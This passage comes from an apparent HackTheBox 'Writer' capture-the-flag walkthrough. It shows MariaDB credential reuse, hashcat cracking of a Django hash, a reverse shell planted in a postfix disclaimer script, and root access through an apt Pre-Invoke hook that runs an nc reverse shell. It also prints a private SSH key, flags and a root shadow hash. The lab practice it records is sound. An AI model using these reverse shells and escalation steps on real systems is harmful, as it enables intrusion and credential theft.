# use it for options that affect everything
#
[client-server]

# Import all .cnf files from configuration directory
!includedir /etc/mysql/conf.d/
!includedir /etc/mysql/mariadb.conf.d/

[client]
database = dev
user = djangouser
password = DjangoSuperPassword
default-character-set = utf8
```

we have username and password to login so let's try that.

``` sql
www-data@writer:/etc/mysql$ mysql -u djangouser -h 127.0.0.1 -p 
DjangoSuperPassword

Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 49
Server version: 10.3.29-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [dev]> show databases;
+--------------------+
| Database           |
+--------------------+
| dev                |
| information_schema |
+--------------------+
2 rows in set (0.001 sec)

MariaDB [dev]> use dev;
Database changed
MariaDB [dev]> show tables;
+----------------------------+
| Tables_in_dev              |
+----------------------------+
| auth_group                 |
| auth_group_permissions     |
| auth_permission            |
| auth_user                  |
| auth_user_groups           |
| auth_user_user_permissions |
| django_admin_log           |
| django_content_type        |
| django_migrations          |
| django_session             |
+----------------------------+
10 rows in set (0.001 sec)

MariaDB [dev]> SELECT * FROM auth_user;
+----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+
| id | password                                                                                 | last_login | is_superuser | username | first_name | last_name | email           | is_staff | is_active | date_joined                |
+----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+
|  1 | pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A= | NULL       |            1 | kyle     |            |           | kyle@writer.htb |        1 |         1 | 2021-05-19 12:41:37.168368 |
+----+------------------------------------------------------------------------------------------+------------+--------------+----------+------------+-----------+-----------------+----------+-----------+----------------------------+
1 row in set (0.001 sec)
```

So we have kyle hash now let's try to crack it.

``` bash
kali@kali:~/HackTheBox/Writer$ hashcat -a 0 -m 10000 hash --wordlist /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1) starting...

OpenCL API (OpenCL 1.2 pocl 1.5, None+Asserts, LLVM 9.0.1, RELOC, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
=============================================================================================================================
* Device #1: pthread-Intel(R) Pentium(R) CPU  N3700  @ 1.60GHz, 1392/1456 MB (512 MB allocatable), 2MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt
* Slow-Hash-SIMD-LOOP

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 64 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8dYWMGYlz4dSArozTY7wcZCS7DV6l5dpuXM4A=:marcoantonio
                                                 
Session..........: hashcat
Status...........: Cracked
Hash.Name........: Django (PBKDF2-SHA256)
Hash.Target......: pbkdf2_sha256$260000$wJO3ztk0fOlcbssnS1wJPD$bbTyCB8...uXM4A=
Time.Started.....: Thu Aug  5 02:46:45 2021 (18 mins, 29 secs)
Time.Estimated...: Thu Aug  5 03:05:14 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:        8 H/s (3.11ms) @ Accel:32 Loops:128 Thr:1 Vec:4
Recovered........: 1/1 (100.00%) Digests
Progress.........: 9408/14344385 (0.07%)
Rejected.........: 0/9408 (0.00%)
Restore.Point....: 9344/14344385 (0.07%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:259968-259999
Candidates.#1....: jodete -> 120287

Started: Thu Aug  5 02:46:39 2021
Stopped: Thu Aug  5 03:05:16 2021
```
and we have the password let's ssh as kyle.

#### Kyle to John

``` bash
┌──(root💀kali)-[~/hackthebox/machine/writer]
└─# ssh kyle@writer.htb
The authenticity of host 'writer.htb (10.10.11.101)' can't be established.
ECDSA key fingerprint is SHA256:GX5VjVDTWG6hUw9+T11QNDaoU0z5z9ENmryyyroNIBI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'writer.htb' (ECDSA) to the list of known hosts.
kyle@writer.htb's password: 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri  6 Aug 08:33:05 UTC 2021

  System load:           0.18
  Usage of /:            64.5% of 6.82GB
  Memory usage:          23%
  Swap usage:            0%
  Processes:             258
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.101
  IPv6 address for eth0: dead:beef::250:56ff:feb9:a196


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


You have new mail.
Last login: Fri Aug  6 04:49:11 2021 from 10.10.14.4
kyle@writer:~$ id
uid=1000(kyle) gid=1000(kyle) groups=1000(kyle),997(filter),1002(smbgroup)
kyle@writer:~$ whoami
kyle
kyle@writer:~$ cat user.txt 
49b120a997fc7fdd05ad84575c2f5477
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2065.jpg)

#### Enumeration
#### Pspy64

``` bash
pipe -n dfilt -t unix flags=Rq user=john argv=/etc/postfix/disclaimer -f ${sender} -- ${recipient} 
/bin/sh /etc/postfix/disclaimer -f kyle@writer.htb -- kyle@writer.htb
python3 sendmail.py
```

This were the few intresting thing from pspy64 so now let's understand how sendmail works.
There are few files we have to check to understand what is happening around so first let's check disclaimer.

```bash
kyle@writer:~$ cat disclaimer
#!/bin/bash
# Localize these.

INSPECT_DIR=/var/spool/filter
SENDMAIL=/usr/sbin/sendmail

# Get disclaimer addresses
DISCLAIMER_ADDRESSES=/etc/postfix/disclaimer_addresses

# Exit codes from <sysexits.h>
EX_TEMPFAIL=75
EX_UNAVAILABLE=69

# Clean up when done or when aborting.
trap "rm -f in.$$" 0 1 2 3 15

# Start processing.
cd $INSPECT_DIR || { echo $INSPECT_DIR does not exist; exit
$EX_TEMPFAIL; }

cat >in.$$ || { echo Cannot save mail to file; exit $EX_TEMPFAIL; }

# obtain From address
from_address=`grep -m 1 "From:" in.$$ | cut -d "<" -f 2 | cut -d ">" -f 1`

if [ `grep -wi ^${from_address}$ ${DISCLAIMER_ADDRESSES}` ]; then
  /usr/bin/altermime --input=in.$$ \
                   --disclaimer=/etc/postfix/disclaimer.txt \
                   --disclaimer-html=/etc/postfix/disclaimer.txt \
                   --xheader="X-Copyrighted-Material: Please visit http://www.company.com/privacy.htm" || \
                    { echo Message content rejected; exit $EX_UNAVAILABLE; }
fi

$SENDMAIL "$@" <in.$$

exit $?
```

Looks like we have a bash script that gets executed to get some sanity checks when we send a mail so let's add a revshell line in it and then trigger it.

EDITED DISCLAIMER FILE.

``` bash
kyle@writer:~$ cat disclaimer
#!/bin/bash
# Localize these.

bash -i &>/dev/tcp/10.10.14.31/1234 0>&1
INSPECT_DIR=/var/spool/filter
SENDMAIL=/usr/sbin/sendmail

# Get disclaimer addresses
DISCLAIMER_ADDRESSES=/etc/postfix/disclaimer_addresses

# Exit codes from <sysexits.h>
EX_TEMPFAIL=75
EX_UNAVAILABLE=69

# Clean up when done or when aborting.
trap "rm -f in.$$" 0 1 2 3 15

# Start processing.
cd $INSPECT_DIR || { echo $INSPECT_DIR does not exist; exit
$EX_TEMPFAIL; }

cat >in.$$ || { echo Cannot save mail to file; exit $EX_TEMPFAIL; }

# obtain From address
from_address=`grep -m 1 "From:" in.$$ | cut -d "<" -f 2 | cut -d ">" -f 1`

if [ `grep -wi ^${from_address}$ ${DISCLAIMER_ADDRESSES}` ]; then
  /usr/bin/altermime --input=in.$$ \
                   --disclaimer=/etc/postfix/disclaimer.txt \
                   --disclaimer-html=/etc/postfix/disclaimer.txt \
                   --xheader="X-Copyrighted-Material: Please visit http://www.company.com/privacy.htm" || \
                    { echo Message content rejected; exit $EX_UNAVAILABLE; }
fi

$SENDMAIL "$@" <in.$$

exit $?
```

Now let's copy this file to /etc/postfix.
And then try to send mail you can do it manually using nc and telnet.

``` bash
kyle@writer:/dev/shm$ cp disclaimer /etc/postfix/disclaimer
kyle@writer:/dev/shm$ nc 127.0.0.1 25
220 writer.htb ESMTP Postfix (Ubuntu)
HELO writer.htb                
250 writer.htb
MAIL FROM: kyle@writer.htb
250 2.1.0 Ok
RCPT TO: john@writer.htb
250 2.1.5 Ok
DATA
From: kyle@writer.htb
To: john@writer.htb
Subject: Test
Date: Thu, 20 Dec 2012 12:00:00 +0000

Testing
.354 End data with <CR><LF>.<CR><LF>

250 2.0.0 Ok: queued as 41B40838
QUIT
221 2.0.0 Bye
EXIT
kyle@writer:/dev/shm$ 
```

But to be fast and not doing it repeatedly I wrote a simple python script to do this stuff for me.

 - send.py

``` python
#!/usr/bin/env python3

import smtplib

host = '127.0.0.1'
port = 25

From = 'kyle@writer.htb'
To = 'john@writer.htb'

Message = '''\
        Subject: HI THERE! JOHN

        OOPS I GOT YOU MATE.
'''

try:
        io = smtplib.SMTP(host,port)
        io.ehlo()
        io.sendmail(From,To,Message)
except Exceptions as e:
        print (e)
finally:
        io.quit()
```

and then run the following command.

``` bash
kyle@writer:/tmp$ cp disclaimer /etc/postfix/disclaimer && python3 send.py
```

the disclaimer is the edited disclaimer file and then sending mail.
and boom we have shell as john.

``` bash
┌──(root💀kali)-[~/hackthebox/machine/writer]
└─# nc -lvp 1234                                                                                                                  
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.11.101.
Ncat: Connection from 10.10.11.101:47120.
bash: cannot set terminal process group (13385): Inappropriate ioctl for device
bash: no job control in this shell
john@writer:/var/spool/postfix$ id
id
uid=1001(john) gid=1001(john) groups=1001(john)
john@writer:/var/spool/postfix$ whoami
whoami
john
```

#### PrivESC
#### Stabilizing the shell

``` bash
john@writer:/var/spool/postfix$ cd /home/john
john@writer:/var/spool/postfix$ ls -al
drwxr-xr-x 4 john john 4096 Aug  5 10:19 .
drwxr-xr-x 4 root root 4096 Jul  9 10:59 ..
lrwxrwxrwx 1 root root    9 May 19 22:20 .bash_history -> /dev/null
-rw-r--r-- 1 john john  220 May 14 18:19 .bash_logout
-rw-r--r-- 1 john john 3771 May 14 18:19 .bashrc
drwx------ 2 john john 4096 Jul 28 09:19 .cache
-rw-r--r-- 1 john john  807 May 14 18:19 .profile
drwx------ 2 john john 4096 Jul  9 12:29 .ssh
-rw------- 1 john john 2751 Aug  5 10:19 .viminfo
john@writer:/var/spool/postfix$ cd .ssh
john@writer:/var/spool/postfix$ ls
authorized_keys
id_rsa
id_rsa.pub
john@writer:/var/spool/postfix$ cat id_rsa
-----BEGIN OPENSSH PRIVATE KEY-----
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
-----END OPENSSH PRIVATE KEY-----
```

Now we have john ssh so let's login as john

``` bash
kali@kali:~/HackTheBox/Writer$ ssh -i id_rsa john@writer.htb 
Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-80-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

 System information disabled due to load higher than 2.0


0 updates can be applied immediately.


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Aug  5 13:36:13 2021 from 10.10.14.59
john@writer:~$ id
uid=1001(john) gid=1001(john) groups=1001(john),1003(management)
```

#### Enumeration

We can see that we are in management group so let's see what files and directory we can access.

``` bash
john@writer:/etc/apt$ find / -group management 2>/dev/null
/etc/apt/apt.conf.d
```

oh this is intresting.

searching for 'writable files in /etc/apt/apt.conf.d privESC' in google we can find the below article which explains gretaly what we have to do to abuse that for privESC.

https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/

Looking through the article there should be something running 'sudo apt-get update' command so let's see if there is anything running that command using pspy64.

``` bash
john@writer:/home/kyle$ ./pspy64s -pf -i 1000 
pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855


     ██▓███    ██████  ██▓███ ▓██   ██▓
    ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
    ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
    ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
    ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
    ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
    ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
    ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                   ░           ░ ░     
                               ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=true ||| Scannning for processes every 1s and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
<--SNIP-->
2021/08/05 16:51:06 CMD: UID=0    PID=374426 | /usr/bin/apt-get update
2021/08/05 16:51:06 CMD: UID=0    PID=374417 | /usr/bin/apt-get update
2021/08/05 16:51:06 CMD: UID=0    PID=374411 | /bin/sh -c /usr/bin/apt-get update
2021/08/05 16:51:06 CMD: UID=0    PID=374406 | /usr/sbin/CRON -f
<--SNIP-->
```

So now we have the prerequiste satify so we can start with exploitation.

#### Exploitation

so we have can create a malicious line in /etc/apt/apt.conf.d/ to get command execution so let's do that before that spin up the listener on your fav port.

And the let's create a file that gets us the reverse shell.

``` bash
john@writer:~$ echo 'apt::Update::Pre-Invoke {"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.31 2234 >/tmp/f"};' > /etc/apt/apt.conf.d/oops
```

and boom we have the shell.

``` bash
┌──(root💀kali)-[~/hackthebox/machine/writer]
└─# nc -lvp 2234
Ncat: Version 7.91 ( https://nmap.org/ncat )
Ncat: Listening on :::2234
Ncat: Listening on 0.0.0.0:2234
Ncat: Connection from 10.10.11.101.
Ncat: Connection from 10.10.11.101:35406.
/bin/sh: 0: can't access tty; job control turned off
# id
uid=0(root) gid=0(root) groups=0(root)
# whoami
root
# cd /root
# cat root.txt
84812ca924eff7423778631959635207
# cat /etc/shadow | grep root
root:$6$gev1Op0YfgboE7iR$iMNbP.8qic/SzTr4atxwLbkI7nScyZWJPbTgoXAlEz5Hcw3Ntget9j3p.iccPcw5Jl4dj4bHWZ5LvoLLNC8iB.:18816:0:99999:7:::
```

Now we are root let's get all the flags.

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb2066.jpg)

#### Summary of knowledge

 - smb enumeration
 - Directory Fuzzing
 - Sql Injection fuzz
 - Sql Injection payload modify
 - Sql Injection to read files
 - python code execution to get rev shell
 - hashcat crack hash
 - Pspy64 enum process
 - get rev shell through DISCLAIMER FILE and send mail
 - PrivESC through apt privilege escalation

#### Contact me

 - QQ: 1185151867
 - twitter: https://twitter.com/fdlucifer11
 - github: https://github.com/FDlucifer

<font color="blue">I'm lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more...</font>
<!-- kb:end writer -->

</details>

